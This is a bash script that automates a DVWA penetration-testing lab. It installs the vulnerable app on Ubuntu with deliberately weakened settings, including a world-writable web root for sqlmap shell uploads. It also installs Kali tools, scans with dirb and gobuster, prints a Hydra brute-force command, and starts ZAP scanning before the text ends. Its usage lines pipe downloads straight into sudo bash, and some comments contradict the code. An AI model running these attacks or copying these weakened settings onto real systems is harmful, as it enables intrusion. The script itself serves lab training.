#!/bin/bash
# Script Name: dvwa-pentest-lab.sh
# Description: Automates DVWA setup on Ubuntu VM and attack tool setup/demonstration on Kali VM,
#              following a penetration testing tutorial.
#
# Usage for Ubuntu DVWA VM:
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s dvwa
#       - Installs SSH, DVWA with Apache2, and modern MySQL.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s mysql50
#       - Removes current DB server (MariaDB/MySQL) and installs MySQL 5.5 via Docker for DVWA.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s set_permissions_ubuntu
#       - Sets read/write permissions for DVWA directory (required for os-shell exploit).
#
# Usage for Kali VM (ensure DVWA Ubuntu VM is running and accessible):
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonGav/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s kali_prereqs
#       - Installs prerequisite attack tools on Kali.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s kali_web_scan
#       - Runs dirb and gobuster web content scanners against DVWA.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s kali_brute_force
#       - Provides instructions and sample commands for brute-force attacks (Burp Suite, Hydra).
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s kali_vuln_scan
#       - Provides guidance for OWASP ZAP or OpenVAS scanning.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s kali_sqlmap_sqli
#       - Provides sample sqlmap commands for basic SQL injection.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s kali_os_shell
#       - Attempts to get an OS shell on DVWA VM via sqlmap and extracts sensitive files.

# Generate the script logs
LOGFILE="$(pwd)/dvwa-pentest-lab-$(date +"%Y%m%d-%H%M%S").log"
exec > >(tee -a "$LOGFILE") 2>&1

# === ASCII Art Banner Start ===
echo ""
echo "##################################################################################"
echo "#   _______  ____    ____ ____    __    ____  ___                                #"
echo "#  |       \ \   \  /   / \   \  /  \  /   / /   \      DVWA PENTEST LAB         #"
echo "#  |  .--.  | \   \/   /   \   \/    \/   / /  ^  \     Setup Script             #"
echo "#  |  |  |  |  \      /     \            / /  /_\  \                             #"
echo "#  |  '--'  |   \    /       \    /\    / /  _____  \   Kali & Ubuntu Automation #"
echo "#  |_______/     \__/         \__/  \__/ /__/     \__\                           #"
echo "#                                                                                #"
echo "#                      Automating your vulnerable web app & attack tools!        #"
echo "##################################################################################"
echo ""
# === ASCII Art Banner End ===

# Stricter Error Handling
set -euo pipefail
IFS=$'\n\t'

### === COLOR CONSTANTS === ###
RESET="\033[0m"
GREEN="\033[1;32m"
RED="\033[1;31m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
PINK="\033[1;35m"
CYAN="\033[1;36m"

### === PRINT FUNCTIONS === ###
print_info() { echo -e "${CYAN}[INFO]${RESET} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${RESET} $1"; }
print_warn() { echo -e "${YELLOW}[WARNING]${RESET} $1"; }
print_error() { echo -e "${RED}[ERROR]${RESET}❌ $1"; }
print_title() { echo -e "\n${PINK}=== $1 ===${RESET}\n"; }

# Signal-safe Cleanup
cleanup() {
  local exit_code=$?
  if [ $exit_code -ne 0 ]; then
    print_error "Script exited with error code: $exit_code"
  fi
  print_info "Cleaning up before exit."
  # Add any specific cleanup logic here, e.g., remove temp files
}
handle_interrupt() {
  print_error "Script interrupted by user (SIGINT)" >&2
  exit 130
}
trap cleanup EXIT
trap handle_interrupt INT

# === GLOBAL CONFIGURATION (USER EDITS REQUIRED ON KALI VM) ===
# IMPORTANT: For Kali VM functions, set the IP of your DVWA Ubuntu VM here.
# This IP must be reachable from your Kali VM.
# Example: "http://192.168.1.100" or "http://dvwa.local"
# Default target URL
DEFAULT_DVWA_TARGET_URL="http://192.168.56.101"

# Check if DVWA_TARGET_URL is already set as an environment variable
# Use ${VAR:-} to check if VAR is unset or empty, but don't modify it yet.
if [ -z "${DVWA_TARGET_URL:-}" ]; then
    echo -ne "\e[96mEnter the DVWA Target URL (default: ${DEFAULT_DVWA_TARGET_URL}, 15s timeout):\e[0m "
    local USER_INPUT_TARGET_URL
    if read -t 15 USER_INPUT_TARGET_URL < /dev/tty; then
        DVWA_TARGET_URL="${USER_INPUT_TARGET_URL:-${DEFAULT_DVWA_TARGET_URL}}" # Use user input if provided, else default
    else
        DVWA_TARGET_URL="${DEFAULT_DVWA_TARGET_URL}" # Timed out, use default
    fi
    print_info "Using DVWA_TARGET_URL (from prompt): ${DVWA_TARGET_URL}"
else
    # DVWA_TARGET_URL was already set as an environment variable
    print_info "Using DVWA_TARGET_URL (from environment variable): ${DVWA_TARGET_URL}"
fi

# Final check to ensure it's not the placeholder and user is aware if it's the default
if [[ "$DVWA_TARGET_URL" == "$DEFAULT_DVWA_TARGET_URL" ]]; then
    print_warn "DVWA_TARGET_URL is set to the default: ${DVWA_TARGET_URL}. Ensure this is correct for your setup."
fi
# -------------------------------------------------------------

### === UBUNTU DVWA VM FUNCTIONS === ###

# Function: ubuntu_install_ssh
# Installs and configures OpenSSH server on Ubuntu.
ubuntu_install_ssh() {
    print_title "=== Installing and Configuring OpenSSH Server ==="

    print_info "Updating system.."
    apt update && apt upgrade -y

    print_info "Installing OpenSSH server.."
    apt install -y openssh-server net-tools curl

    print_info "Editing SSH configuration: /etc/ssh/sshd_config"
    local SSHD_CONFIG="/etc/ssh/sshd_config"
    sed -i 's/^#Port 22/Port 22/' "$SSHD_CONFIG" || print_warn "Port 22 already uncommented or missing."
    sed -i 's/^#ListenAddress 0.0.0.0/ListenAddress 0.0.0.0/' "$SSHD_CONFIG" || print_warn "ListenAddress 0.0.0.0 already uncommented or missing."
    sed -i 's/^#PasswordAuthentication yes/PasswordAuthentication yes/' "$SSHD_CONFIG" || print_warn "PasswordAuthentication yes already uncommented or missing."
    # Optional: Enable root login, generally not recommended for security reasons
    # sed -i 's/^PermitRootLogin prohibit-password/PermitRootLogin yes/' "$SSSD_CONFIG" || true

    print_info "Configuring UFW firewall for SSH access.."
    ufw status || true
    ufw enable || print_warn "UFW already enabled."
    ufw allow 22 || print_warn "UFW rule for port 22 already exists."

    print_info "Restarting SSH service.."
    systemctl restart ssh

    print_success "OpenSSH server installed successfully!"
}

# Function: ubuntu_install_dvwa_apache_mysql
# Installs DVWA with Apache2, PHP, and Modern MySQL on Ubuntu.
ubuntu_install_dvwa_apache_mysql() {
    print_title "=== Installing DVWA with Apache2 and Modern MySQL ==="

    local DB_NAME="dvwa"
    local DB_USER="dvwa"
    local DB_HOST="localhost"
    local WEB_DIR="/var/www/html/dvwa"
    local SERVER_NAME="localhost" # Can be updated dynamically if needed.

    # --- Ask for SQL user password ---
    echo -e "\e[96mEnter SQL password for DVWA user (press Enter ↲ for default: pass):\e[0m"
    if ! read -t 15 -s DB_PASS < /dev/tty; then
        DB_PASS="pass"
    fi
    echo
    DB_PASS=${DB_PASS:-pass}

    print_info "Installing required packages for DVWA (Apache, PHP, MySQL).."
    apt update
    apt install -y apache2 mysql-server php php-mysqli php-gd php-zip php-json php-bcmath php-xml libapache2-mod-php git

    print_info "Enabling and starting Apache & MySQL.."
    systemctl enable apache2 --now
    systemctl enable mysql --now

    print_info "Cloning DVWA repository.."
    cd /var/www/html
    if [ -d "DVWA" ] || [ -d "dvwa" ]; then
        print_info "DVWA folder already exists, skipping clone.."
    else
        git clone https://github.com/digininja/DVWA.git
        mv DVWA dvwa
    fi

    print_info "Setting permissions.."
    sudo chown -R www-data:www-data /var/www/html/dvwa
    sudo chmod -R 755 /var/www/html/dvwa

    print_info "Configuring MySQL for DVWA.."
    # This assumes root can connect to MySQL initially without a password, or via auth_socket.
    print_info "Attempting to create DVWA database and user. You might be prompted for MySQL root password if set."
    # Using 'mysql -p' to ensure it prompts for password if root has one set.
    mysql -u root -p <<EOF
    CREATE DATABASE IF NOT EXISTS ${DB_NAME};
    CREATE USER IF NOT EXISTS '${DB_USER}'@'${DB_HOST}' IDENTIFIED BY '${DB_PASS}';
    GRANT ALL PRIVILEGES ON ${DB_NAME}.* TO '${DB_USER}'@'${DB_HOST}';
    FLUSH PRIVILEGES;
EOF

    print_info "Updating DVWA config file.."
    cd "$WEB_DIR/config" || { print_error "DVWA config directory not found."; exit 1; }
    cp -n config.inc.php.dist config.inc.php
    local CONFIG_FILE="/var/www/html/dvwa/config/config.inc.php"
    if [ ! -f "$CONFIG_FILE" ]; then
        print_error "Error: Configuration file not found at $CONFIG_FILE"
        exit 1
    fi
    sed -i 's/\r//g' "$CONFIG_FILE"
    sed -i "/'db_server'/c\\
    \$_DVWA[ 'db_server' ] = '$DB_HOST';
    " "$CONFIG_FILE"
    sed -i "/'db_user'/c\\
    \$_DVWA[ 'db_user' ] = '$DB_USER';
    " "$CONFIG_FILE"
    sed -i "/'db_password'/c\\
    \$_DVWA[ 'db_password' ] = '$DB_PASS';
    " "$CONFIG_FILE"
    print_info "DVWA configuration file updated successfully."

    print_info "Configuring PHP settings for DVWA.."
    local PHP_VER=$(php -r 'echo PHP_MAJOR_VERSION.".".PHP_MINOR_VERSION;' 2>/dev/null || echo "8.3") # Fallback to 8.3
    local PHPINI="/etc/php/${PHP_VER}/apache2/php.ini"
    sed -i 's/^\s*allow_url_fopen\s*=.*/allow_url_fopen = On/' "$PHPINI" || true
    sed -i 's/^\s*allow_url_include\s*=.*/allow_url_include = On/' "$PHPINI" || true

    print_info "Restarting Apache.."
    systemctl restart apache2

    ### Apache Configuration for Localhost Only ###
    print_info "Setting Apache to localhost-only mode"
    # 1) Set GLOBAL ServerName in apache2.conf to prevent AH00558 warning
    if ! grep -q "ServerName" /etc/apache2/apache2.conf; then
        print_info "Adding global ServerName to apache2.conf"
        echo "ServerName ${SERVER_NAME}" | sudo tee -a /etc/apache2/apache2.conf > /dev/null
    else
        print_info "Updating existing global ServerName in apache2.conf"
        sudo sed -i "s/^ServerName.*/ServerName ${SERVER_NAME}/" /etc/apache2/apache2.conf
    fi
    # 2) Set Apache to listen only on 127.0.0.1:80
    sed -i 's/^Listen .*/Listen 80/' /etc/apache2/ports.conf
    # 3) Create DVWA VirtualHost config
    sudo tee /etc/apache2/sites-available/dvwa.conf > /dev/null <<EOF
    <VirtualHost *:80>
        ServerName ${SERVER_NAME}
        DocumentRoot /var/www/html

        <Directory /var/www/html/dvwa>
            Options Indexes FollowSymLinks
            AllowOverride All
            Require all granted
        </Directory>

        ErrorLog \${APACHE_LOG_DIR}/dvwa_error.log
        CustomLog \${APACHE_LOG_DIR}/dvwa_access.log combined
    </VirtualHost>
EOF
    # 3 Enable site and modules
    sudo a2ensite dvwa.conf || print_warn "DVWA site already enabled."
    sudo a2enmod rewrite || print_warn "Rewrite module already enabled."
    sudo a2dissite 000-default.conf || print_warn "Default site already disabled."
    sudo apache2ctl configtest
    sudo apache2ctl -S

    print_info "Configuring UFW firewall for HTTP access.."
    ufw allow 80 || print_warn "UFW rule for port 80 already exists."

    # 4 Restart Apache
    sudo systemctl restart apache2

    echo "======================================="
    print_success "[✔] DVWA configured successfully (Modern MySQL)!"
    print_title "Global ServerName set to ${SERVER_NAME}"
    curl -I http://localhost/dvwa/setup.php || print_warn "Curl to setup.php failed, verify Apache is running."
    print_title "  → Accessible at: http://${SERVER_NAME}/dvwa/setup.php"
    print_title "Default DB User: ${DB_USER}, Password: ${DB_PASS}"
    print_title " Username : admin"
    print_title " Password : password (DVWA default)"
    echo "======================================="
}

# Function: ubuntu_install_mysql_docker_vulnerable
# Removes current database and installs MySQL 5.5 in Docker for DVWA on Ubuntu.
ubuntu_install_mysql_docker_vulnerable() {
    print_title "=== Installing Vulnerable MySQL (Dockerized) for DVWA ==="
    print_warn "Note: MySQL 5.0.15 is not readily available as a pre-built Docker image."
    # MySQL 5.5: https://hub.docker.com/layers/library/mysql/5.5/images/sha256-d404d78aa797c87c255e5ae2beb5d8d0e4d095f930b1f20dc208eaa957477b74
    print_warn "This script will install MySQL 5.5 in a Docker container as an older, vulnerable alternative."
    print_warn "If you specifically need 5.0.15, you would need to build a custom Docker image from source."

    local VULN_MYSQL_VERSION="5.5" # Using 5.5 as a readily available vulnerable version via Docker Hub
    local CONTAINER_NAME="dvwa-vulnerable-mysql"
    local MYSQL_ROOT_PASSWORD="password" # Consistent with other parts of the script
    local DVWA_DB_NAME="dvwa"
    local DVWA_DB_USER="dvwa"
    local DVWA_DB_PASS="pass"
    local DB_HOST="localhost" # DVWA will connect to localhost, which is mapped to the container

    print_warn "This will stop and remove existing MySQL/MariaDB packages and data, and then install Docker."
    print_warn "It will then deploy a MySQL ${VULN_MYSQL_VERSION} Docker container."
    echo -ne "Are you sure you want to continue? (y/N) "
    if ! read -t 15 -n 1 -r REPLY < /dev/tty; then
        REPLY="N"
    fi
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        print_info "Aborting vulnerable MySQL Docker installation."
        exit 1
    fi

    # 1. Stop and purge existing database servers
    print_info "Stopping and purging existing database servers (MySQL/MariaDB) to avoid port conflicts.."
    systemctl stop mysql || true
    systemctl stop mariadb || true
    apt-get purge -y mysql-server mysql-client mysql-common mysql-server-core-* mysql-client-core-* mariadb-server mariadb-client mariadb-common || true
    apt-get autoremove -y
    apt-get clean
    rm -rf /etc/mysql /var/lib/mysql /var/lib/mysql/mysql # Clean up old data directories
    print_success "Existing database services purged."

    # 2. Install Docker
    print_info "Installing Docker.."
    apt-get update
    # Install Docker's required packages
    apt-get install -y ca-certificates curl gnupg lsb-release
    # Add Docker's GPG key
    mkdir -m 0755 -p /etc/apt/keyrings
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg
    # Add Docker repository
    echo \
      "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
      $(lsb_release -cs) stable" | tee /etc/apt/sources.list.d/docker.list > /dev/null
    apt-get update
    # Install Docker components
    apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
    systemctl enable docker --now
    print_success "Docker installed and started."

    # 3. Pull and Run MySQL Docker Container
    print_info "Pulling MySQL ${VULN_MYSQL_VERSION} Docker image.."
    docker pull mysql:"${VULN_MYSQL_VERSION}" || { print_error "Failed to pull MySQL Docker image. Check internet connection or Docker Hub access."; exit 1; }

    print_info "Stopping and removing any old '${CONTAINER_NAME}' container if it exists.."
    docker stop "${CONTAINER_NAME}" &>/dev/null || true
    docker rm "${CONTAINER_NAME}" &>/dev/null || true

    print_info "Starting MySQL ${VULN_MYSQL_VERSION} Docker container '${CONTAINER_NAME}'.."
    # Map container port 3306 to host port 3306, relying on native DB being purged.
    # Environment variables handle initial root password, DVWA database, and DVWA user creation.
    docker run --name "${CONTAINER_NAME}" \
               -e MYSQL_ROOT_PASSWORD="${MYSQL_ROOT_PASSWORD}" \
               -e MYSQL_DATABASE="${DVWA_DB_NAME}" \
               -e MYSQL_USER="${DVWA_DB_USER}" \
               -e MYSQL_PASSWORD="${DVWA_DB_PASS}" \
               -p 3306:3306 \
               -d mysql:"${VULN_MYSQL_VERSION}" || { print_error "Failed to start MySQL Docker container. Check 'docker logs ${CONTAINER_NAME}' for details."; exit 1; }

    print_info "Waiting for MySQL container to become healthy (up to 90 seconds).."
    local RETRIES=18 # 18 * 5 seconds = 90 seconds
    local COUNT=0
    while ! docker exec "${CONTAINER_NAME}" mysqladmin ping -h localhost --silent; do
        sleep 5
        COUNT=$((COUNT+1))
        if [ "$COUNT" -ge "$RETRIES" ]; then
            print_error "MySQL Docker container did not start in time. Check 'docker logs ${CONTAINER_NAME}' and 'docker ps'."
            exit 1
        fi
        print_info "Still waiting for MySQL container ($COUNT/$RETRIES).."
    done
    print_success "MySQL ${VULN_MYSQL_VERSION} Docker container started and is responsive."

    # 4. Update DVWA Config
    print_info "Updating DVWA config file for Dockerized MySQL.."
    local WEB_DIR_DVWA="/var/www/html/dvwa"
    local CONFIG_FILE="$WEB_DIR_DVWA/config/config.inc.php"
    if [ ! -f "$CONFIG_FILE" ]; then
        print_error "DVWA configuration file not found at $CONFIG_FILE. Did DVWA get installed first?"
        exit 1
    fi
    sed -i 's/\r//g' "$CONFIG_FILE" # Remove Windows-style carriage returns
    sed -i "/'db_server'/c\\
    \$_DVWA[ 'db_server' ] = '$DB_HOST';
    " "$CONFIG_FILE"
    sed -i "/'db_user'/c\\
    \$_DVWA[ 'db_user' ] = '$DVWA_DB_USER';
    " "$CONFIG_FILE"
    sed -i "/'db_password'/c\\
    \$_DVWA[ 'db_password' ] = '$DVWA_DB_PASS';
    " "$CONFIG_FILE"
    print_info "DVWA configuration file updated for Dockerized MySQL."

    print_success "Vulnerable MySQL (${VULN_MYSQL_VERSION}) Docker container is running and DVWA is configured to use it!"
    print_info "Remember to ensure your DVWA web server (Apache2) is running on the Ubuntu VM."
    print_info "Go to DVWA's /setup.php page in your browser (http://localhost/dvwa/setup.php) to configure and create the database tables."
    print_info "MySQL Docker container '${CONTAINER_NAME}' is configured to start automatically with Docker."
}

# Function: ubuntu_set_dvwa_permissions
# Sets read/write permissions for the DVWA directory on Ubuntu (for OS shell exploit).
ubuntu_set_dvwa_permissions() {
    print_title "=== Setting DVWA Directory Permissions for OS Shell Exploitation ==="
    local DVWA_PATH="/var/www/html/dvwa"
    if [ ! -d "$DVWA_PATH" ]; then
        print_error "DVWA directory '$DVWA_PATH' not found. Please ensure DVWA is installed first."
        exit 1
    fi
    print_warn "WARNING: This command makes the DVWA directory and its contents world-writable (ugo+rw), which is a significant security risk for any production environment!"

    echo -ne "Are you absolutely sure you want to run 'chmod -R ugo+rw ${DVWA_PATH}'? (y/N) "
    if ! read -t 15 -n 1 -r REPLY < /dev/tty; then
        REPLY="N"
    fi
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        print_info "Aborting permission change. OS shell exploitation might fail without this."
        exit 1
    fi

    sudo chmod -R ugo+rw "$DVWA_PATH"
    print_success "Permissions set for $DVWA_PATH to be world-writable (ugo+rw)."
    print_info "This is specifically for enabling sqlmap's --os-shell upload capabilities to write files to the web root."
}


### === KALI VM FUNCTIONS === ###

# Function: kali_install_tools_prerequisites
# Installs common penetration testing tools on Kali Linux.
kali_install_tools_prerequisites() {
    print_title "=== Installing Kali Attack Tools Prerequisites ==="

    print_info "Updating system and installing required attack tools.."
    sudo apt update
    # Included burpsuite and zaproxy as they are in Kali repos, but still warn about GUI/setup.
    sudo apt install -y \
      dirb gobuster seclists \
      hydra sqlmap nikto burpsuite zaproxy \
      python3-pip \
      net-tools curl git # Basic utilities

    print_info "Installing zap-cli (Python wrapper for OWASP ZAP API).."
    pip3 install zap-cli || print_warn "Failed to install zap-cli. ZAP automation might not work."
    sudo apt-get install -y openjdk-17-jdk # ZAP often relies on a Java JDK

    print_info "--- Tool-Specific Notes ---"
    print_warn "Burp Suite and OWASP ZAP are typically GUI applications. You may need to launch them manually."
    print_info "Burp Suite: Launch from applications menu or 'burpsuite'."
    print_info "OWASP ZAP GUI: Launch from applications menu or 'zaproxy'. This script will use ZAP in daemon mode for automation."
    print_warn "OpenVAS (GVM) setup can be complex and requires 'gvm-setup' or 'openvas-setup' to be run interactively and will take a long time (hours)."
    print_info "Consider installing 'kali-linux-default' or 'kali-linux-web' metapackages for a broader set of tools if you need more."
    print_info "---------------------------"

    print_success "Kali attack tools prerequisites installation complete."
}

# Function: kali_run_web_content_scanners
# Runs dirb and gobuster against the DVWA target URL.
kali_run_web_content_scanners() {
    print_title "=== Running Web Content Scanners (dirb, gobuster) ==="

    local TARGET="$DVWA_TARGET_URL"
    local WORDLIST="/usr/share/wordlists/dirb/common.txt" # Common wordlist for dirb/gobuster
    local OUTDIR="$HOME/scans/dvwa/web_content"
    mkdir -p "$OUTDIR"

    print_info "Targeting DVWA VM at: ${TARGET}"

    # Check if the target is reachable before scanning
    local TARGET_HOST=$(echo "$TARGET" | sed -E 's/https?:\/\///; s/:.*//; s/\/.+//')
    if ! ping -c 1 "$TARGET_HOST" &>/dev/null; then
        print_error "Cannot reach target DVWA VM at ${TARGET_HOST}. Ensure network connectivity and correct DVWA_TARGET_URL."
        exit 1
    fi
    # Also check if the web server is responding
    if ! curl -s -o /dev/null -w "%{http_code}" "$TARGET" | grep -q "^200"; then
        print_warn "DVWA target ${TARGET} returned non-200 HTTP status code. It might not be fully functional or accessible."
    fi

    # Run dirb scan
    print_info "Starting Dirb scan against ${TARGET}.."
    if [ -f "$WORDLIST" ]; then
        dirb "$TARGET" "$WORDLIST" -o "$OUTDIR/dirb_raw.txt" || print_warn "Dirb scan failed or completed with errors. Check target and wordlist."
    else
        print_error "Wordlist not found: $WORDLIST. Skipping dirb scan."
    fi

    # Run gobuster scan with increased threads for speed
    print_info "Starting Gobuster scan against ${TARGET}.."
    if [ -f "$WORDLIST" ]; then
        gobuster dir -u "$TARGET" -w "$WORDLIST" -t 50 -o "$OUTDIR/gobuster_raw.txt" || print_warn "Gobuster scan failed or completed with errors. Check target and wordlist."
    else
        print_error "Wordlist not found: $WORDLIST. Skipping gobuster scan."
    fi

    print_info "Processing web content scan results.."
    if [ -f "$OUTDIR/dirb_raw.txt" ]; then
        grep '^==>' "$OUTDIR/dirb_raw.txt" | awk '{print $3}' | sed "s|$TARGET||" | sort -u > "$OUTDIR/dirb_paths.txt" || true
    else
        print_warn "Dirb raw output not found, cannot process dirb paths."
    fi

    if [ -f "$OUTDIR/gobuster_raw.txt" ]; then
        grep -E '^/' "$OUTDIR/gobuster_raw.txt" | awk '{print $1}' | sort -u > "$OUTDIR/gobuster_paths.txt" || true
    else
        print_warn "Gobuster raw output not found, cannot process gobuster paths."
    fi

    if [ -f "$OUTDIR/dirb_paths.txt" ] && [ -f "$OUTDIR/gobuster_paths.txt" ]; then
        comm -12 "$OUTDIR/dirb_paths.txt" "$OUTDIR/gobuster_paths.txt" > "$OUTDIR/common_paths.txt" || true
        print_info "Common paths found by dirb and gobuster saved to $OUTDIR/common_paths.txt"
    else
        print_warn "Cannot compare paths, one or both path files missing."
    fi

    print_success "Web content scan results saved in $OUTDIR"
    print_info "Review files in $OUTDIR for discovered web objects (directories and files)."
}

# Function: kali_demonstrate_brute_force
# Provides instructions and sample commands for brute-force attacks using Burp Suite and Hydra.
kali_demonstrate_brute_force() {
    print_title "=== Brute-Force Attack Demonstration ==="

    local TARGET="$DVWA_TARGET_URL"
    local TARGET_HOST=$(echo "$TARGET" | sed -E 's/https?:\/\///; s/:.*//; s/\/.+//')
    local ROCKYOU_WORDLIST="/usr/share/wordlists/rockyou.txt.gz"
    local FALLBACK_WORDLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
    local DVWA_BRUTE_FORCE_PATH="/dvwa/vulnerabilities/brute/"

    print_info "Targeting DVWA VM at: ${TARGET}"

    print_info "1. Prepare DVWA (from Kali browser):"
    print_info "   - Log into DVWA as 'admin' / 'password'."
    print_info "   - Navigate to 'DVWA Security' and set the 'Security Level' to 'Low'."
    print_info "   - Click 'Submit'."
    print_warn "   Remember to note your PHPSESSID cookie value from browser developer tools after logging in."
    echo ""

    print_info "2. Enter DVWA Session ID for Hydra (required):"
    echo -ne "Enter DVWA PHPSESSID (e.g., 534uuj0t5702leo6gmot7b5c76, 15s timeout): "
    if ! read -t 15 -s DVWA_PHPSESSID < /dev/tty; then
        DVWA_PHPSESSID=""
    fi
    echo
    if [ -z "$DVWA_PHPSESSID" ]; then
        print_error "DVWA PHPSESSID is required for the Hydra command. Aborting brute-force demo."
        exit 1
    fi

    print_info "3. Hydra brute force sample command (CLI alternative):"
    local WORDLIST_TO_USE=""
    if [ -f "$ROCKYOU_WORDLIST" ]; then
        print_info "Using rockyou.txt.gz wordlist: ${ROCKYOU_WORDLIST}"
        WORDLIST_TO_USE="$ROCKYOU_WORDLIST"
    elif [ -f "$FALLBACK_WORDLIST" ]; then
        print_warn "rockyou.txt.gz not found. Falling back to common passwords: ${FALLBACK_WORDLIST}."
        WORDLIST_TO_USE="$FALLBACK_WORDLIST"
    else
        print_error "No suitable password wordlist found. Please install rockyou.txt.gz or seclists."
        exit 1
    fi

    # Hydra command updated to http-post-form with PHPSESSID
    echo "${GREEN}hydra -l admin -P \"${WORDLIST_TO_USE}\" \"${TARGET_HOST}\" http-get-form '${DVWA_BRUTE_FORCE_PATH}:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=${DVWA_PHPSESSID};security=low:F=Username and/or password incorrect.'${RESET}"
    print_info "   - '-l admin' specifies the username 'admin'."
    print_info "   - '-P' specifies the password list (rockyou.txt.gz or fallback)."
    print_info "   - '${TARGET_HOST}' is the IP/hostname of your DVWA VM."
    print_info "   - 'http-post-form' targets a POST login form."
    print_info "   - '${DVWA_BRUTE_FORCE_PATH}:username=admin&password=^PASS^&Login=Login' defines the target path and POST data."
    print_info "   - 'H=Cookie:PHPSESSID=${DVWA_PHPSESSID};security=low' injects the session cookie and security level into the HTTP header."
    print_info "   - 'F=Username and/or password incorrect.' is the failure string to detect failed logins."
    echo ""

    print_info "4. Burp Suite configuration (manual steps):"
    print_info "   - Start Burp Suite (Community Edition is sufficient)."
    print_info "   - Configure your Kali browser (e.g., Firefox) to use Burp as an HTTP proxy (typically localhost:8080)."
    print_info "   - Turn 'Intercept is on' in Burp Proxy tab."
    print_info "   - Navigate to DVWA's brute force page: ${DVWA_BRUTE_FORCE_PATH}"
    print_info "   - Enter any username/password (e.g., 'admin'/'password') and click 'Login'."
    print_info "   - Intercept the request in Burp, right-click, and 'Send to Intruder'."
    print_info "   - In Intruder, define attack type (e.g., 'Sniper')."
    print_info "   - Set payload positions for the 'password' field."
    print_info "   - Load a password wordlist (e.g., from /usr/share/seclists) for the password payload."
    print_info "   - Start the attack and analyze responses to find successful logins (look for different response lengths/status codes)."

    print_success "Brute-force attack instructions provided. Manual execution and observation are required."
}

# Function: kali_demonstrate_vuln_scanners
# Provides guidance for using OWASP ZAP or OpenVAS for vulnerability scanning.
kali_demonstrate_vuln_scanners() {
    print_title "=== Vulnerability Scanning Demonstration (OWASP ZAP / OpenVAS) ==="

    if ! command -v zap-cli &> /dev/null; then
        print_error "zap-cli is not installed. Please run 'kali_prereqs' first or install it manually via 'pip3 install zap-cli'."
        exit 1
    fi

    local TARGET="$DVWA_TARGET_URL"
    local TARGET_HOST=$(echo "$TARGET" | sed -E 's/https?:\/\///; s/:.*//; s/\/.+//')
    local OUTDIR="$HOME/scans/dvwa/vuln_reports"
    mkdir -p "$OUTDIR"

    print_info "Targeting DVWA VM at: ${TARGET}"

    # Check if the target is reachable before scanning
    if ! ping -c 1 "$TARGET_HOST" &>/dev/null; then
        print_error "Cannot reach target DVWA VM at ${TARGET_HOST}. Ensure network connectivity and correct DVWA_TARGET_URL."
        exit 1
    fi
    # Also check if the web server is responding
    if ! curl -s -o /dev/null -w "%{http_code}" "$TARGET" | grep -q "^200"; then
        print_warn "DVWA target ${TARGET} returned non-200 HTTP status code. It might not be fully functional or accessible. Proceeding, but verify."
    fi

    print_info "1. Prepare DVWA for ZAP Scan:"
    print_info "   - Open your Kali browser (e.g., Firefox) and navigate to ${TARGET}/dvwa/setup.php."
    print_info "   - Complete DVWA setup if needed (click 'Create / Reset Database')."
    print_info "   - Log into DVWA as 'admin' / 'password'."
    print_info "   - Navigate to 'DVWA Security' and set the 'Security Level' to 'Low'."
    print_info "   - Click 'Submit'."
    print_warn "   You MUST obtain your PHPSESSID cookie from browser developer tools after logging in."
    echo ""

    print_info "2. Enter DVWA Session ID for ZAP Scan (required for authenticated scans):"
    echo -ne "Enter DVWA PHPSESSID (e.g., 534uuj0t5702leo6gmot7b5c76, 15s timeout): "
    local DVWA_PHPSESSID=""
    if ! read -t 15 -s DVWA_PHPSESSID < /dev/tty; then
        DVWA_PHPSESSID=""
    fi
    echo
    if [ -z "$DVWA_PHPSESSID" ]; then
        print_error "DVWA PHPSESSID is required for authenticated ZAP scans. Aborting ZAP automation."
        # Continue to OpenVAS section, don't exit script
    else
        print_info "Starting OWASP ZAP in daemon (headless) mode.."
        # Ensure previous ZAP instances are stopped
        zap-cli shutdown || true
        zap-cli start --daemon -p 8080 -d || { print_error "Failed to start ZAP daemon. Check Java installation or ZAP logs."; exit 1; }
        print_success "OWASP ZAP daemon started on port 8080."
        sleep 5 # Give ZAP a moment to initialize

        print_info "Accessing DVWA URL with ZAP and providing session cookie.."
        # Setting a global session token for ZAP
        zap-cli context new "dvwa-context" "${TARGET}" || true
        zap-cli context assign "dvwa-context" -u "${TARGET}" || true
        # Add the PHPSESSID as a global session token to ZAP
        zap-cli http-sessions set-active-token "${TARGET}" "PHPSESSID" "${DVWA_PHPSESSID}" || true
        zap-cli open-url "${TARGET}/dvwa/vulnerabilities/sqli/" || print_warn "Failed to open URL with ZAP. Check ZAP logs."

        print_info "Starting ZAP Spider scan on ${TARGET}.."
        zap-cli spider "${TARGET}" --context-name "dvwa-context" --user-name "admin" || print_warn "ZAP Spider scan failed or completed with errors."
        print_success "ZAP Spider scan completed."

        print_info "Starting ZAP Active Scan on ${TARGET} (this may take some time).."
